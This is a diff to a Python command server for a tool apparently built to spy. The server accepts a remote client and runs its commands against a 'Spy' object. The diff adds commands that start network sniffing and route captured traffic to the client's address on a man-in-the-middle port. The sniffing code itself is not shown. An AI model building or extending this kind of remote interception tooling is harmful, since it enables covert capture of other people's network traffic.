@@ -9,16 +9,17 @@ from inspect import signature
 class Server:
     def __init__(self):
         self.spy = Spy()
-        self.socket = socket.socket()
+        self.socket = socket()
         self.client: Optional[socket.socket] = None
         self.client_address: Optional[Tuple[str, int]] = None
         self.client_live = False
 
     def wait_for_client(self):
+        self.socket.bind(("0.0.0.0", PORT))
         while True:
-            self.socket.bind(("0.0.0.0", PORT))
             self.socket.listen()
             self.client, self.client_address = self.socket.accept()
+            print(self.client_address)
             self.client_live = True
             self.wait_for_command()
 
@@ -27,6 +28,9 @@ class Server:
             try:
                 data = receive_msg(self.client)
             except ConnectionError:
+                self.client_live = False
+                return
+            except ValueError:
                 self.client_live = False
                 return
             data = data.split(str(Massages.SEP))
@@ -38,26 +42,35 @@ class Server:
         match command:
             case str(Massages.EXIT):
                 return str(Massages.BYE)
-        if command in SPY_COMMANDS:
-            command = SPY_COMMANDS[command]
-            function = getattr(self.spy, command, None)
-            if not function:
-                return str(Massages.INVALID_COMMAND)
-            if not is_valid_num_of_params(function, len(params)):
-                return str(Massages.INVALID_NUMBER_OF_PARAMS)
-            if not cast_params(function, params):
-                return str(Massages.INVALID_PARAMS)
-            result = function(*params)
-            if isinstance(result, str):
-                return result
-            if isinstance(result, bool):
-                return str(Massages.OK if result else Massages.NOT_OK)
-            else:
-                return str(result)
-        elif command in OTHER_COMMANDS:
-            pass
-        else:
+            case "start_sniffing_on_net":
+                if len(params) == 0:
+                    return self.execute_command(command, [self.client_address[0], MITM_DEFAULT_PORT])
+            case "start_sniffing_to_file":
+                if len(params) == 1:
+                    return self.execute_command(command, [params[0], self.client_address[0], MITM_DEFAULT_PORT])
+        # if command in SPY_COMMANDS:
+        #     command = SPY_COMMANDS[command]
+        function = getattr(self.spy, command, None)
+        if not function:
+            if command in OTHER_COMMANDS:
+                pass
             return str(Massages.INVALID_COMMAND)
+        if not is_valid_num_of_params(function, len(params)):
+            return str(Massages.INVALID_NUMBER_OF_PARAMS)
+        if not cast_params(function, params):
+            return str(Massages.INVALID_PARAMS)
+        try:
+            result = function(*params)
+        except Exception as e:
+            print(e)
+            return str(e)
+        if isinstance(result, str):
+            return result
+        if isinstance(result, bool):
+            return str(Massages.OK if result else Massages.NOT_OK)
+        else:
+            return str(result)
+
 
 
 def is_valid_num_of_params(func: callable, num: int) -> bool:
@@ -93,6 +106,7 @@ def cast_params(func: callable, params: list) -> bool:
             continue
         try:
             params[i] = param.annotation(params[i])
+            i += 1
         except Exception:
             return False
     return True
